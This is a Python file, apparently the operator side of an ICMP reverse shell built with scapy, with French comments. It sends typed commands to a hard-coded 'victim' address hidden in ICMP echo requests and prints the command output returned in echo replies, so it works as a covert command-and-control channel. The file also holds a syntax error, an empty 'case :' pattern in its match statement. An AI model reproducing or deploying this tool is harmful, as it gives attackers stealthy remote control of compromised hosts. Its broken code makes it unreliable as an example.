from scapy.all import *
from scapy.layers.inet import IP, ICMP
import threading
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"

"""
ICMP PACKET
https://cryptsus.com/blog/icmp-reverse-shell.html

0                   1                     2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier (ID)     |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Optional Data                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""


class Server:
    """
    On définis une classe Server qui aura pour but:
        -d'écouter le traffic réseaux
        -de filtrer les paquets
        -d'envoyer les commandes
    """

    def __init__(self, victim_ip, packet_id):
        """"""
        self.victim = victim_ip
        self.ID = packet_id
        self.TTL = 64

    def main(self):
        """
        Méthode de classe qui aura pour but d'initialiser l'audit du traffic
        On utilisera un sniffer asynchrone (https://scapy.readthedocs.io/en/latest/usage.html)
        afin d'avoir une I/O non-bloquante.
        """

        icmp_sniffer = threading.Thread(target=sniff, kwargs={'prn': self.filter,'store': False, 'filter': 'icmp'})
        icmp_sniffer.start()

        while True:
            data = input(f"[{self.victim}]>")
            match data:

                case "exit":
                    print(f"[{self.victim}]Connection Closed")
                    break

                case :
                    # On crée une charge utile que l'on enverra par la suite
                    payload = (IP(dst=self.victim, ttl=self.TTL) / ICMP(type=8, id=self.ID) / Raw(load=data))
                    # Envoi de la charge utile
                    sr(payload, timeout=0, verbose=0)

                case _:
                    pass

    def filter(self, packet):
        """
        On va filtrer plus en profondeur le paquet afin de vérifier que notre paquet est celui
        qu'on veut (via l'identifier ICMP).
        Par la suite on se chargera de récupérer les données dans l'optional Data

        On oublie pas de filtrer le type de paquet ICMP
        -echo-reply (type 0)
        -echo-request (code 8)
        """

        if packet[IP].src == self.victim and packet[ICMP].type == 0 and packet[ICMP].id == self.ID and packet[Raw].load:
            data = (packet[Raw].load).decode('utf-8', errors='ignore').replace('\n', '')
            print(data)


if __name__ == "__main__":
    icmp_door_server = Server("192.168.1.62", 13170)
    icmp_door_server.main()